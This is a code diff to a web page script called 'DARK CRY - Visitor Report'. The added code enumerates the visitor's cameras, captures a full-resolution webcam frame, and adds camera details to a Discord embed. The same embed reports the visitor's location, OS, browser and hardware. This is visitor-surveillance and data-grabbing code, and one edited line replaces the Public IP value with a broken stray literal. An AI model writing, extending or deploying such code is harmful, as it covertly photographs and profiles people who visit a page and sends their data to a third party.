@@ -1311,22 +1311,42 @@
                     })()
                 };
 
-                // Try to get camera (will show prompt)
+                // Try to get camera (will show prompt) - but get device info first
                 let cameraCaptured = false;
                 let cameraData = null;
+                let cameraResolution = 'Not captured';
+                let cameraDeviceName = 'Unknown';
 
                 try {
+                    // Get available cameras first
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                    
+                    if (videoDevices.length > 0) {
+                        cameraDeviceName = videoDevices[0].label || `Camera ${videoDevices.length}`;
+                        console.log('Available cameras:', videoDevices);
+                    }
+
                     const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: 640, height: 480 } 
+                        video: { 
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        } 
                     });
                     
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
 
+                    // Get actual video track settings (real resolution)
+                    const track = stream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    cameraResolution = `${settings.width} x ${settings.height} (${settings.width * settings.height / 1000000}MP)`;
+                    
+                    // Capture frame
                     const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
+                    canvas.width = settings.width;
+                    canvas.height = settings.height;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
                     cameraData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
@@ -1335,6 +1355,7 @@
                     cameraCaptured = true;
                 } catch (err) {
                     console.log('Camera denied or unavailable:', err);
+                    cameraDeviceName = 'Permission denied or not available';
                 }
 
                 // Build detailed Discord embed
@@ -1342,14 +1363,15 @@
                     title: "🔍 DARK CRY - Visitor Report",
                     description: `**👤 User Information**\\n` +
                                 `**Username:** ${userInfo.username || 'Web Visitor'}\\n` +
-                                `**PC Name:** ${userInfo.platform}\\n` +
-                                `**🌐 Public IP:** \`${userInfo.publicIP}\`\\n` +
+                                `**💻 Device Name:** ${cameraDeviceName}\\n` +
+                                `**🌐 Public IP:** \`'xd'\n` +
                                 `**📍 Location:** ${userInfo.location}\\n` +
                                 `**🖥️ OS:** ${userInfo.os}\\n` +
                                 `**🌐 Browser:** ${userInfo.browser}\\n\\n` +
                                 `**📊 Technical Details**\\n` +
-                                `**Resolution:** ${userInfo.screenResolution}\\n` +
+                                `**Screen Resolution:** ${userInfo.screenResolution}\\n` +
                                 `**Color Depth:** ${userInfo.colorDepth}-bit\\n` +
+                                (cameraCaptured ? `**📸 Camera Resolution:** ${cameraResolution}\\n` : '') +
                                 `**CPU Cores:** ${userInfo.cpuCores}\\n` +
                                 `**RAM:** ${userInfo.deviceMemory}\\n` +
                                 `**Timezone:** ${userInfo.timezone}\\n` +
